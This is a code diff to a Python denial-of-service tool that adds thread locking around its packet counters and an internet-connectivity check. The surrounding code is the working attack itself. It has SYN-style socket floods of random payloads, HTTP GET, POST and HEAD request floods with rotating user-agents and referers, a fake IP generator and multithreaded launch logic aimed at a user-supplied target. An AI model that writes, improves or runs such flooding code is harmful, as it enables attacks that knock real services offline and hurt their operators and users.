@@ -8,14 +8,12 @@
 import sys, socket, os, time, random, threading, requests, signal, optparse, re
 from urllib.parse import urlparse
 import http.client as http
-
 ## COLORS ###############
 wi="\033[1;37m" #>>White#
 rd="\033[1;31m" #>Red   #
 gr="\033[1;32m" #>Green #
 yl="\033[1;33m" #>Yellow#
 #########################
-
 __version__ = '1.0.0'
 headers_useragents = list()
 headers_useragents.append("Mozilla/5.0 (Linux; Android 9; JKM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Mobile Safari/537.36")
@@ -3211,8 +3209,6 @@ headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV
 headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHqTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
 headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
 headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
-
-
 headers_referers = list()
 headers_referers.append('http://www.google.com/?q=')
 headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
@@ -3345,9 +3341,7 @@ headers_referers.append('http://www.google.com/?q=')
 headers_referers.append('http://www.usatoday.com/search/results?q=')
 headers_referers.append("http://validator.w3.org/check?uri=")
 headers_referers.append("")
-
 os.system("cls || clear")
-
 get_data = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 115\r\nConnection: keep-alive\r\n\r\n'
 i = 1
 fake_ip = lambda: ".".join(str(random.randint(0, 255)) for _ in range(4))
@@ -3363,7 +3357,9 @@ def syn_flood():
             s.connect((target,port))
             for _ in range(500):
                 s.send(random._urandom(65500))
+                lock.acquire()
                 i+=1
+                lock.release()
                 print("["+rd+"Flooding"+wi+f"]: (=>{target}:{port}<=) Packets sent :: ["+yl+f"{i}"+wi+"]", end='\r')
                 if isKilled(): break
             s.close()
@@ -3386,7 +3382,9 @@ def get_attack():
                         s.connect((target,port))
                         if s.sendto( get_packet, (target,port) ):
                                 s.shutdown(1)
+                                lock.acquire()
                                 i+=1
+                                lock.release()
                                 print("["+rd+"Flooding"+wi+f"]: (=>{target}:{port}<=) Packets sent :: ["+yl+f"{i}"+wi+"]", end='\r')
                         else:
                                 s.shutdown(1)
@@ -3412,7 +3410,9 @@ def post_attack():
                s.send(post_packet)
                s.send(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890").encode('ascii'))
                s.shutdown(1)
+               lock.acquire()
                i+=1
+               lock.release()
                print("["+rd+"Flooding"+wi+f"]: (=>{target}:{port}<=) Packets sent :: ["+yl+f"{i}"+wi+"]", end='\r')
                if isKilled():break
                time.sleep(.1)
@@ -3430,7 +3430,9 @@ def request_get_attack():
     while True:
         try:
             req = requests.get(url, headers={'User-Agent': random.choice(headers_useragents), 'Content-Type': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Referer": random.choice(headers_referers)}, timeout=5)
+            lock.acquire()
             i+=1
+            lock.release()
             print("["+rd+"Flooding"+wi+f"]: (=>{target}:{port}<=) Packets sent :: ["+yl+f"{i}"+wi+f"]", end='\r')
             if isKilled():break
         except (Exception,BaseException) as err:
@@ -3447,7 +3449,9 @@ def request_post_attack():
     while True:
         try:
             req = requests.post(url, headers={'User-Agent': random.choice(headers_useragents), "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/plain", "Referer": random.choice(headers_referers)}, data={'test':'test'}, timeout=5)
+            lock.acquire()
             i+=1
+            lock.release()
             print("["+rd+"Flooding"+wi+f"]: (=>{target}:{port}<=) Packets sent :: ["+yl+f"{i}"+wi+f"]", end='\r')
             if isKilled():break
         except (Exception,BaseException) as err:
@@ -3464,7 +3468,9 @@ def head_attack():
     while True:
         try:
             req = requests.head(url, headers={'User-Agent': random.choice(headers_useragents),'Content-Type': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Referer": random.choice(headers_referers)}, timeout=5)
+            lock.acquire()
             i+=1
+            lock.release()
             print("["+rd+"Flooding"+wi+f"]: (=>{target}:{port}<=) Packets sent :: ["+yl+f"{i}"+wi+f"]", end='\r')
             if isKilled():break
         except (Exception,BaseException) as err:
@@ -3474,7 +3480,6 @@ def head_attack():
             if isKilled(): break
             continue
         if isKilled():break
-
 
 def cnet(server='www.google.com', port=80) -> bool:
    try:
@@ -3617,23 +3622,28 @@ if target.startswith(("https://", "http://")):
 else:
     url = "http://"+target + "/"
 target = urlparse(url).netloc
-
-print(wi + "[" + yl + "~" + wi + f"] Setting Up Attack " + wi + " [...]", end='\r')
+print(wi+"["+yl+"~"+wi+"] Check Internet Connection [...]", end='\r')
 time.sleep(2)
-print("["+gr+"+"+wi+"]"+wi+f" Setting Up Attack "+wi+" ["+gr+target+wi+":"+gr+str(port)+wi+"/"+yl+attack.upper()+wi+"~"+gr+str(threads)+wi+"]\n", end='\r')
+if not cnet():
+    print("["+rd+"-"+wi+"] Check Internet Connection ["+rd+"Fail"+wi+"]\n", end='\r')
+    print("  ["+rd+"!"+wi+"]"+yl+" Please Check Your Internet Connection And Try Again "+rd+"!!!"+wi)
+    if target.startswith(("www.google.","google.")):
+        sys.exit(1)
+else:
+    print("["+gr+"+"+wi+"] Check Internet Connection ["+gr+"Connected"+wi+"]\n", end='\r')
 print(wi + "[" + yl + "~" + wi + f"] Check The Connection To The Target " + gr + f"{target}" + wi + ":" + rd + f"{port}" + wi + " [...]", end='\r')
 time.sleep(2)
 if not cnet(target,port):
     print("["+rd+"-"+wi+"] Check The Connection To The Target "+gr+f"{target}"+wi+":"+rd+f"{port}"+wi+" ["+rd+"Fail"+wi+"]\n", end='\r')
-    print(rd+"  ["+yl+"!"+rd+"]"+yl+" Error: Unable to Connect to Target On "+rd+f"{target}"+yl+":"+rd+f"{port}"+yl+f" :: {'Please Check Your Internet Connection' if not cnet() else 'Please Check Your Target or port'}"+rd+" !!!\n"+wi)
+    print(rd+"  ["+yl+"!"+rd+"]"+yl+" Error: Unable to Connect to Target On "+rd+f"{target}"+yl+":"+rd+f"{port}"+rd+" !!!\n"+wi)
     sys.exit(1)
-
 print("["+gr+"+"+wi+"]"+wi+f" Check The Connection To The Target "+gr+f"{target}"+wi+":"+rd+f"{port}"+wi+" ["+gr+"Connected"+wi+"]\n", end='\r')
 print(wi+"["+yl+"~"+wi+"] Starting "+gr+f"{threads}"+wi+" Threads [...]", end='\r')
 THREADS = list()
 event = threading.Event()
 kill = lambda: event.set()
 isKilled = lambda: event.isSet()
+lock = threading.Lock()
 time.sleep(1.5)
 print("["+gr+"+"+wi+"] Starting "+gr+f"{threads}"+wi+" Threads ["+gr+"DONE"+wi+"]\n",end='\r')
 time.sleep(1.5)
